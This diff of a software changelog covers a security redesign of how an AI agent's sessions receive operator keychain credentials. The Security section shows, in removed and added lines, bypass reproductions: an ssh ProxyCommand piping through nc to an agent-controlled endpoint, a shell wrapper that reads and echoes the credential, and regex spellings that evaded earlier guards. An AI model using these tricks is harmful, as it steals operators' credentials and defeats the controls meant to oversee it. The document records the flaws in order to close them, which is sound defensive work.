@@ -21,9 +21,12 @@ surfaces rather than redacted on them.
   asking, or the call's own `timeout_secs` elapses. What the agent gets back is
   a status and a **byte count** — never the value, and never a handle it could
   exchange for one.
+- **Operator-declared session profiles** (`[[security.profiles]]`) and
+  `start_session(profile:, vars:)`. The operator writes the command line with
+  named slots; the agent supplies values into them and never writes a command
+  line. See **Security** for the whole of it.
 - **Keychain autofill from operator-declared bindings** (`[[security.secret_bindings]]`).
-  A binding names a pattern for the session's whole command line, a prompt
-  pattern, a provider
+  A binding names a **profile**, an optional prompt pattern, a provider
   (`secret-service`, `security`, `pass`, `op`) and a reference in that provider.
   The agent supplies no part of the lookup and cannot enumerate what exists:
   every way a binding fails to resolve falls through silently to the human
@@ -54,126 +57,107 @@ surfaces rather than redacted on them.
     and `prompt` has none, so the pair reads *"on"* and behaves *"off"* — for
     the single most consequential switch in the file. Set `secret_provider` to
     `"keychain"` or `"both"`, or leave autofill off.
-  - A `[[security.secret_bindings]]` entry whose `match_command` or
-    `match_prompt` is not a valid regex. The whole block was unread at 0.0.6, so
-    a typo'd pattern was inert; it is now a load error, because a binding that
-    never matches is indistinguishable from a credential store that is down.
-  - A `[[security.secret_bindings]]` entry with no `match_example`, or one whose
-    `match_command` admits anything beyond it — including `^ssh\s+prod-01.*`,
-    `^.*ssh\s+prod-01$` and `^ssh.*prod-01$`, but not because any of them is
-    *spelled* that way. See **Security** below for the rule and for why this one
-    is a refusal and not a warning.
+  - A `[[security.secret_bindings]]` entry whose `match_prompt` is not a valid
+    regex, or whose `profile` names no `[[security.profiles]]` entry. The whole
+    block was unread at 0.0.6, so a typo'd pattern was inert; it is now a load
+    error, because a binding that never matches is indistinguishable from a
+    credential store that is down.
 
   §10.2's published example is unaffected: it ships `autofill_on_echo_off =
   false` alongside `secret_provider = "prompt"`, which passes the new rule.
 
+- **Every `[[security.secret_bindings]]` entry an operator has written stops
+  loading, and the error names the key.** `match_command` and `match_example`
+  are gone and `profile` is required, so a binding carrying either fails
+  §10.1's unknown-key rule. Declare a `[[security.profiles]]` for the command
+  line the binding was for and point the binding at it; see **Security** for
+  why a deprecation window on those two keys would have been a deprecation
+  window on the bypass class.
+
 ### Security
 
-- **`match_command` matches the session's *whole* command line, not a prefix**
-  (GH #45). It used to be an unanchored regex search over `command` and `args`
-  joined with spaces — a string the agent writes in full — so an operator's
-  pattern constrained only the part of the line the agent chose to leave alone.
-  §9.6's own published example was exploitable exactly as published: against
-  `^ssh\s+(\S+@)?prod-0[12]\b`, an agent calling
+- **The operator writes the command line and the agent fills named slots in it**
+  (GH #46). This is what closed GH #45, and it retires the bypass class rather
+  than mitigating it: `match_command` and `match_example` are **gone**, along
+  with the load-time corpus that judged one against the other.
 
+  ```toml
+  [[security.profiles]]
+  name    = "prod-ssh"
+  program = "ssh"                       # a literal; no {…}
+  args    = ["{user}@{host}"]
+
+    [security.profiles.vars]
+    user = "^[a-z][a-z0-9_-]{0,30}$"
+    host = "^prod-0[12]$"
+
+  [[security.secret_bindings]]
+  name    = "prod-ssh-cred"
+  profile = "prod-ssh"
   ```
-  start_session("ssh", ["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222"])
-  ```
 
-  matched the binding, and the operator's credential was typed into an `ssh`
-  whose transport it had pointed at its own endpoint. Reproduced end to end
-  against a real daemon, not inferred.
+  `start_session` gains `profile` and `vars`, mutually exclusive with
+  `command`/`args`. `command`/`args` is **unchanged** — nothing is at stake in a
+  session that cannot receive a credential.
 
-  **Operators must update patterns.** A binding written for `ssh prod-01` now
-  needs to describe that line to its end — `^ssh\s+prod-01$` — and one written
-  for a session that takes arguments has to name them. §9.6's published example
-  changes from `…prod-0[12]\b` to `…prod-0[12]$` for the same reason.
+  **Why the shape changed rather than the check.** Four guard shapes over
+  `match_command` were tried and each was defeated by someone who attacked it
+  instead of reading it: anchoring (bypassed at the other end), a ~180-line
+  syntactic scanner (20 accepted spellings), a 9-probe behavioural corpus (the
+  whole insertion class missed), and a 51-probe corpus — where a review found 46
+  bypasses and **the cheapest dodge fell from six characters to one**, `[^ ]*`,
+  because all 51 probe texts contain a space. Widening the corpus made the dodge
+  *cheaper*, not dearer: a larger probe set shares more structure, and a negated
+  class excludes shared structure in a single stroke. That measurement is what
+  ended the argument.
 
-- **Every binding now carries a required `match_example`, and a `match_command`
-  that admits anything beyond it is refused at load.** Anchoring alone has one
-  failure mode and it is silent: the first operator whose legitimate session
-  stops matching writes `.*` at four in the morning, and the hole is back with
-  nothing to see.
+  **The asymmetry that makes a slot a different problem from a command line.** A
+  slot is bounded — one value, matched whole, with no "rest of the line" to
+  append to. Arguments come from the template, so the agent cannot *add* one.
+  Therefore **a badly-written slot pattern is bounded damage**: `host = ".*"`
+  lets the agent choose a hostname and it still cannot add a flag, where one
+  sloppy `match_command` gave it unlimited extra arguments. `host = ".*"` is
+  accepted for that reason, and `match_command = ".*"` was a load error for the
+  other.
 
-  `match_example` is the command line you are asserting the binding is for. At
-  load the pattern — wrapped exactly as the matcher wraps it — must match that
-  example, and must **not** match it under a corpus of hostile transformations:
-  an agent's argument **appended**, the same argument **spliced in at any of the
-  example's token boundaries**, a command of the agent's own put **in front**,
-  or an **unrelated** line entirely. The texts are capabilities rather than
-  punctuation — `-o ProxyCommand`, `-F` (an entire alternate `ssh_config`),
-  `-i`, `-E`, `-J`/`-W`/`-L`, `-e ^]`, `StrictHostKeyChecking=no`, `-S`, `--`,
-  `psql --set= -c '\! …'` and `COPY … FROM PROGRAM`, alongside the shell
-  operators that put a second command on one line.
+  **Substitution happens within one argv element.** `args` is an array of
+  strings and exactly one output element is produced per template element, so a
+  value containing spaces, quotes, `;`, `&&` or a leading `-` stays a single
+  argument and cannot become a second one. There is no join, no split and no
+  shell. GH #45's reproduction is therefore not merely refused through a profile
+  — it is **not expressible**: `ssh prod-01 -o ProxyCommand=…` is a four-element
+  argv, and `program = "ssh"` with `args = ["{user}@{host}"]` is two.
 
-  **Both ends, because the reflex has two spellings and the trailing one is only
-  the more obvious.** `^.*ssh\s+prod-01$` is matched by a session whose command
-  line is `sh -c "…read x; echo GOT $x; ssh prod-01"` — the agent's own program,
-  reading the credential and echoing it, with `ssh` never reached at all. The
-  prefix probes are what refuse it.
+  **The rules, each a load error naming the key.** `program` is a literal and
+  admits no `{…}` — a slot there would let the agent choose the binary, which no
+  pattern over an *argument* can bound. Every `{name}` in `args` has a `vars`
+  entry and every `vars` entry is used by a slot: a slot with no pattern is
+  unguarded, and a pattern with no slot is a typo the operator should learn at
+  startup rather than at 3am. Each var pattern compiles wrapped exactly as the
+  renderer wraps it (`\A(?:…)\z`, by the same function at both ends). Profile
+  names are unique, and a binding naming an unknown profile is refused.
 
-  **And the middle, which is where an `ssh` command line actually takes its
-  options.** `^ssh.*prod-01$` pins both ends and admits
-  `ssh -o ProxyCommand=nc 127.0.0.1 2222 prod-01` — this issue's own
-  reproduction line. The insertion probes are what refuse it.
+  **What this does not close, stated plainly.** A profile bounds *which* command
+  line a credential can reach and *which* credential an agent can obtain. It
+  says nothing about the credential's **effect**: an agent that reaches a
+  profile-started session still obtains an interactive shell on the target once
+  injection succeeds, which is the feature working. And a slot pattern is still
+  the operator's to write.
 
-  **This replaced a syntactic scanner, and that is the change worth reading.**
-  The first version of this check read the pattern's *text*, peeling anchors and
-  wrapping groups off each end looking for `.*` and its friends. It grew to ~180
-  lines and a review that attacked it still drove **twenty** accepted spellings
-  past it — `\p{Any}*`, `[\x00-\x{10FFFF}]*`, `((.))*`, `(?:.|x)*`, `(.*)*`,
-  `^(a|.*|b)$`, three `(?x)` free-spacing forms and more — each one still
-  admitting a line of the agent's own choosing. Asking what a pattern *admits*,
-  with the regex engine as the oracle, refuses all twenty without naming any of
-  them.
+- **A session started with `command`/`args` can never receive a keychain
+  credential.** That is the safety property, and it is also a real capability
+  loss — both halves are true and this entry says both. An agent can only run
+  credentialed sessions the operator anticipated; an operator who forgets a
+  profile finds out when a legitimate workflow stops autofilling.
 
-  **If some arguments really are optional, enumerate them.**
-  `^ssh\s+prod-01( -4| -6)?$` admits exactly the two lines it names. What the
-  refusal message used to recommend instead — `^ssh\s+prod-01( -X.*)?$`, "a
-  wildcard scoped to one argument" — is **refused now**, and it should never
-  have been suggested: `( -X.*)?` is not one argument, it is a two-character
-  gate in front of an unbounded tail, and it admits
-  `ssh prod-01 -X -o ProxyCommand=nc 127.0.0.1 2222`. The guard was handing its
-  own bypass to every operator it refused.
-
-  **Operators upgrading must add `match_example`, and six previously-accepted
-  patterns now fail.** `[^\x00]*` and `[^q]*` went first: they were accepted as
-  escape hatches on the reasoning that a negated class says something specific
-  about what an operator will not admit, and `ssh prod-01; evil` contains
-  neither a NUL nor a `q`. Four more go with this release —
-  `^ssh\s+prod-01( -X.*)?$` and `^psql\s+-h\s+prod( --set=.*)?$` (above),
-  `^ssh.*prod-01$` (the open middle), and `^ssh\s+(a|.*x)$`, whose `.*x` admits
-  any line ending in `x` and therefore `ssh a -oProxyCommand=/tmp/x` — the
-  space-free spelling of the same attack. Write the arguments out, name several
-  programs with an alternation, or enumerate the optional ones.
-
-  **What the corpus is, and what it is not.** It is a finite sample of the
-  question "what does this pattern admit". A pattern can always be tailored to
-  reject a known probe set and admit everything else — gate a `.*` behind a flag
-  no probe happens to use. Widening the corpus, as this release does, raises the
-  cost of finding such a gate; **it does not remove it, and no version of this
-  check removes it.** The previous release said the opposite about the open
-  middle — "no probe can reach the middle of a line whose two ends the pattern
-  pins" — and that sentence is how `^ssh.*prod-01$` stayed accepted for a
-  release while admitting the reproduction line. What removes the question is
-  **GH #46**, operator-declared session profiles: the agent fills slots and
-  never authors a command line, so there is no language to approximate.
-
-- **`match_prompt` is documented as what it is: an operator convenience, not a
-  security control.** No behaviour changed and none needed to; what changed is
-  every place that let a reader infer otherwise. It sits beside `match_command`
-  in the config, in §9.6 and in `binding.rs`, and structural proximity reads as
-  equivalent purpose.
-
-  It is a *conjunct*: a binding needs `match_command` **and**, when
-  `match_prompt` is non-empty, the prompt — so it can only narrow a selection
-  `match_command` already made, never widen one. It gets no `match_example`-style
-  check for three reasons: it cannot produce a selection hole; `""` (the
-  documented default) already means "does not select on the prompt", so `.*`
-  means what a permitted value means; and there is no hostile-probe corpus to
-  write, because **the agent chooses the child and therefore chooses the
-  prompt** — any pattern over prompt text is satisfied by an agent that has
-  already passed `match_command`, since it prints whatever the pattern asks for.
+- **`match_prompt` is unchanged, and is still not a security control.** It
+  narrowed within a `match_command` and it narrows within a profile: a
+  *conjunct*, so it can only remove candidates a selection already made. It gets
+  no load-time check of its own for the same three reasons — it cannot produce a
+  selection hole; `""` (the documented default) already means "does not select
+  on the prompt", so `.*` means what a permitted value means; and there is no
+  hostile-probe corpus to write, because **the agent chooses the child and
+  therefore chooses the prompt**.
 
   What it is *for* is disambiguating between prompts inside a session that has
   already matched: "this credential is for the login prompt, not the sudo
